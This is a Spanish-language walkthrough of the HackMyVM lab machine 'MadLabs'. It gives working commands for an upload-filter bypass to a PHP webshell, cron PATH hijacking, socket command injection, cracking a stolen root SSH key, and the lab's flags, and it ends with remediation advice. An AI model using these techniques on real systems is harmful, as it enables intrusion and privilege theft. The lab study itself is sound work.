[Inicio](../../../README.md) · [Red Team](../../README.md)

**Estado: completada** · [Versión HTML](MadLabs-Writeup.html) (descargar y abrir en el navegador)

---

# MadLabs — HackMyVM — Writeup completo

> **Plataforma:** HackMyVM · **Nombre:** MadLabs · **Tema:** Frankenstein / "Mad Science"
> **Dificultad estimada:** Media · **Objetivo:** flag de usuario + flag de root
> **Cadena:** `www-data → igor → frankenstein → root`

---

## 0. Resumen ejecutivo

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Acceso inicial | Bypass de filtro de subida (`.phtml`) → RCE | `www-data` |
| PrivEsc #1 | **PATH hijacking** de un cron de `igor` (`reanimator_core`) | `igor` |
| PrivEsc #2 | **Command injection** en un socket UNIX (`reanimate.sock`) | `frankenstein` |
| PrivEsc #3 | Clave SSH de root robada + passphrase crackeada (`halloween`) | `root` |

**Flags**

- **User:** `HMV{tr1ck_0r_tr34t_g1v3_m3_r00t_0r_1_t4k3_0v3r_y0ur_syst3m}`
- **Root:** `HMV{n0t_4_gh0st_j1st_4_r00t_us3r_1n_y0ur_syst3m}`

---

## 1. Reconocimiento

### 1.1 Descubrimiento de puertos

```bash
nmap -sV -sC -p- --min-rate 2000 -T4 192.168.1.34
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
|_http-title: Mad Labs | Medical Dashboard
MAC Address: 08:00:27:xx:xx:xx (Oracle VirtualBox virtual NIC)
```

Solo dos servicios: SSH (muy actualizado, poca superficie) y una **web app** Apache/PHP. El vector principal es la web.

### 1.2 Enumeración web

La página (`Mad Labs | Medical Dashboard`, temática Frankenstein) contiene pistas y un **formulario de subida**:

- Usuario mencionado: `igor` · "Dr. V. Frankenstein".
- Ruta: `/opt/laboratory/reanimator_core`.
- *"Authorized laboratory personnel can upload the latest `.raw` cranial scans here for immediate analysis."*

```bash
# Enumeración de contenido
gobuster dir -u http://192.168.1.34/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,phtml,txt,html
```

```
/assets    (301)
/css       (301)
/js        (301)
/uploads   (301)   ← directory listing activo (destino de subidas)
/upload.php (200)
```

El `js/main.js` revela que el filtro `.raw` es **solo frontend** (regex JavaScript) y que el backend es `upload.php`:

```javascript
const allowedExtension = /(\.raw)$/i;   // solo valida en el navegador
...
fetch("upload.php", { method: "POST", body: formData })
```

---

## 2. Acceso inicial — `www-data`

### 2.1 Análisis del filtro de subida

Probando la subida vía `curl` (saltando el JS):

```bash
# .raw legítimo → OK
curl -s -F "medical_scan=@test.raw" http://192.168.1.34/upload.php
# [SUCCESS] Core tissue scan loaded into matrix: test.raw

# .php directo → bloqueado
curl -s -F "medical_scan=@shell.php;filename=shell.php" http://192.168.1.34/upload.php
# [SECURITY ALERT] Malicious extension detected. Execution vector blocked.
```

El backend (`upload.php`) usa una **lista negra** de extensiones:

```php
$blacklist = array("php", "php3", "php4", "php5", "php7", "phps", "phar", "inc");
$file_ext  = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
if (in_array($file_ext, $blacklist)) { /* bloqueado */ }
else { move_uploaded_file(... $target_dir . basename($file_name)); }
```

`phtml` y `pht` **no están en la lista** y Apache los ejecuta como PHP.

### 2.2 Bypass → webshell

```bash
# Probar variantes de extensión
for e in shell.phtml shell.pht shell.php.raw; do
  curl -s -F "medical_scan=@payload;filename=$e" http://192.168.1.34/upload.php
done
# ALLOWED: shell.phtml, shell.pht, shell.php.raw

# Verificar ejecución
curl -s http://192.168.1.34/uploads/shell.phtml   # → PWNED:42  ✅ RCE
```

Webshell de comandos:

```bash
cat > cmd.phtml <<'EOF'
<?php if(isset($_GET['c'])){ echo "<pre>"; system($_GET['c']); echo "</pre>"; } ?>
EOF
curl -s -F "medical_scan=@cmd.phtml;filename=cmd.phtml" http://192.168.1.34/upload.php

curl -s "http://192.168.1.34/uploads/cmd.phtml?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 💡 **Nota:** una reverse shell con `mkfifo` a un listener también funciona para un shell interactivo. La webshell es suficiente para enumerar de forma determinista.

---

## 3. Enumeración como `www-data`

```bash
# Usuarios con shell
grep -E "sh$" /etc/passwd
# root:x:0:0:...:/bin/bash
# frankenstein:x:1000:1000:...:/bin/bash
# igor:x:1001:1001::/home/igor:/bin/bash

# Grupos clave
grep -E "madmanagers|sudo" /etc/group
# sudo:x:27:frankenstein            ← frankenstein → root
# madmanagers:x:1002:igor,frankenstein
```

Artefactos del laboratorio:

```bash
ls -laR /opt/laboratory
# drwxrwxr-x igor         madmanagers  .            ← grupo madmanagers con escritura
# -rwxr-xr-x igor         madmanagers  reanimator_core      (world-readable)
# -rw-rw---- frankenstein madmanagers  reanimate_service.py (solo grupo)
# drwxrwx--- frankenstein madmanagers  monsters/

systemctl cat reanimate.service
# User=frankenstein / Group=igor
# ExecStart=/usr/bin/python3 /opt/laboratory/reanimate_service.py
# RuntimeDirectory=madlabs  (→ /run/madlabs, 0770 frankenstein:igor)

ss -xlnp | grep madlabs
# /run/madlabs/reanimate.sock   ← socket del servicio (como frankenstein)
```

**Mapa de la escalada:**

- `reanimator_core` → cron de **igor** cada minuto (escribe `js/voltage_metrics.json`).
- `reanimate.sock` → servicio de **frankenstein**, alcanzable solo por el grupo `igor`.
- `igor ∈ madmanagers` → puede sobrescribir ficheros en `/opt/laboratory`.
- `frankenstein ∈ sudo` → camino final a root.

> ⚠️ El box está **endurecido**: `hidepid=invisible,subset=pid` oculta procesos ajenos y `/proc/sys` (anula `pspy`). Esto obliga a un vector concreto.

---

## 4. PrivEsc #1 — `www-data → igor` (PATH hijacking)

`reanimator_core` (world-readable) corre **cada minuto como igor** y llama a binarios **sin ruta absoluta**:

```bash
#!/bin/bash
JSON_OUTPUT="/var/www/html/js/voltage_metrics.json"
TIME_SEED=$(date +%s)                                 # ← date (bare)
RAW_VOLTAGE=$(echo "$VOLTAGE_INT" | awk '{...}')      # ← awk  (bare)
CLEAN_VOLTAGE=$(echo "$RAW_VOLTAGE" | cut -d'.' -f1)  # ← cut  (bare)
```

El `$PATH` del cron de igor incluye un directorio **escribible por www-data**. Plantamos binarios maliciosos con esos nombres:

```bash
# Payload: marca ejecución como igor + crea bash SUID
PAY='#!/bin/bash
cp /bin/bash /var/crash/.ib 2>/dev/null; chmod 6777 /var/crash/.ib 2>/dev/null
R=$(command -v -p BIN); exec "$R" "$@"'

for dir in /tmp /var/tmp /dev/shm /var/www/html/uploads \
           /var/lib/php/sessions /var/crash /var/cache/apache2/mod_cache_disk; do
  for b in date awk cut; do
    echo "$PAY" | sed "s/BIN/$b/g" > "$dir/$b"; chmod 755 "$dir/$b"
  done
done
```

> 🧠 **El gran truco (que casi me frena):** el cron corre con **`PrivateTmp`**, así que cualquier marcador escrito en `/tmp` o `/var/tmp` cae en un *namespace privado invisible*. Hay que escribir las pruebas en `/dev/shm` o `/var/crash` (fuera de PrivateTmp). Además, la bash SUID **no puede ir en `/dev/shm` ni `/tmp`** porque están montados `nosuid` → se coloca en `/var/crash` (ext4).

Tras un ciclo del cron:

```bash
ls -la /var/crash/.ib
# -rwsrwsrwx 1 igor igor 1540520 ... /var/crash/.ib   ← bash SUID de igor

/var/crash/.ib -p -c 'id'
# uid=33(www-data) euid=1001(igor) egid=1001(igor)     ← ¡ejecución como igor! ✅
```

El `.bash_history` de igor revela el siguiente paso:

```bash
/var/crash/.ib -p -c 'cat /home/igor/.bash_history'
# ls -la /opt/laboratory/
# cat /opt/laboratory/reanimator_core
# ls -la /run/madlabs/
# echo "STATUS:1818" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
```

---

## 5. PrivEsc #2 — `igor → frankenstein` (command injection en socket)

Con permisos de igor (grupo `madmanagers`) el cron puede leernos el código del servicio:

```python
# /opt/laboratory/reanimate_service.py  (corre como frankenstein)
while True:
    conn, _ = server.accept()
    data = conn.recv(1024).decode('utf-8').strip()
    if data.startswith("STATUS:"):
        _, monster_id = data.split(":", 1)
        cmd = f"cat /opt/laboratory/monsters/{monster_id}.status 2>/dev/null"  # ⬅ INYECCIÓN
        stream = os.popen(cmd)
        conn.sendall(stream.read().encode() or b"SUBJECT NOT FOUND IN THE MATRIX\n")
```

`monster_id` se interpola directo en un `os.popen` (shell). Inyectamos con `;cmd #`:

```bash
# Crear una bash SUID de frankenstein
printf 'STATUS:z;cp /bin/bash /var/crash/.fb;chmod 6777 /var/crash/.fb #\n' > /var/crash/.inj
/var/crash/.ib -p -c 'socat - UNIX-CONNECT:/run/madlabs/reanimate.sock < /var/crash/.inj'

ls -la /var/crash/.fb
# -rwsrwsrwx 1 frankenstein igor ... /var/crash/.fb

/var/crash/.fb -p -c 'id; cat /home/frankenstein/user.txt'
# uid=33(www-data) euid=1000(frankenstein) egid=1001(igor)
# HMV{tr1ck_0r_tr34t_g1v3_m3_r00t_0r_1_t4k3_0v3r_y0ur_syst3m}   ← USER FLAG 🏴
```

---

## 6. PrivEsc #3 — `frankenstein → root` (clave SSH robada)

El home de frankenstein contiene una **clave privada de root**:

```bash
/var/crash/.fb -p -c 'ls -la /home/frankenstein/.ssh'
# -r-------- 1 frankenstein frankenstein id_rsa_root

/var/crash/.fb -p -c 'cat /home/frankenstein/.ssh/id_rsa_root' > id_rsa_root
```

Está cifrada (aes256-ctr / bcrypt). La crackeamos:

```bash
ssh2john id_rsa_root > rsa.hash
john --wordlist=rockyou.txt rsa.hash
# id_rsa_root:halloween        ← passphrase 🔑

# Entrar como root
ssh-keygen -p -f id_rsa_root -P 'halloween' -N ''   # quitar passphrase
chmod 600 id_rsa_root
ssh -i id_rsa_root root@192.168.1.34
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
# HMV{n0t_4_gh0st_j1st_4_r00t_us3r_1n_y0ur_syst3m}   ← ROOT FLAG 👑
```

---

## 7. Flags

| Flag | Valor |
|------|-------|
| **User** | `HMV{tr1ck_0r_tr34t_g1v3_m3_r00t_0r_1_t4k3_0v3r_y0ur_syst3m}` |
| **Root** | `HMV{n0t_4_gh0st_j1st_4_r00t_us3r_1n_y0ur_syst3m}` |

---

## 8. Remediación

1. **Subida de ficheros:** validar con *allowlist* de extensión **y** MIME real; servir `/uploads/` sin motor PHP (`php_admin_flag engine off`) y sin *directory listing*.
2. **Cron de `reanimator_core`:** usar **rutas absolutas** (`/usr/bin/awk`, `/usr/bin/cut`, `/usr/bin/date`) y un `PATH` fijo que nunca incluya directorios escribibles por servicios web.
3. **Servicio del socket:** no construir comandos shell con entrada del cliente; usar `subprocess.run([...], shell=False)` y validar `monster_id` contra una *allowlist*.
4. **Clave de root:** jamás almacenar la clave privada de root en el home de otro usuario; usar passphrases fuertes y rotarlas.
5. **Hardening general positivo del box:** `hidepid`, `nosuid`, `PrivateTmp` ya dificultan la explotación — mantenerlos.

---

*Writeup generado tras una evaluación autorizada sobre una máquina local de HackMyVM.*

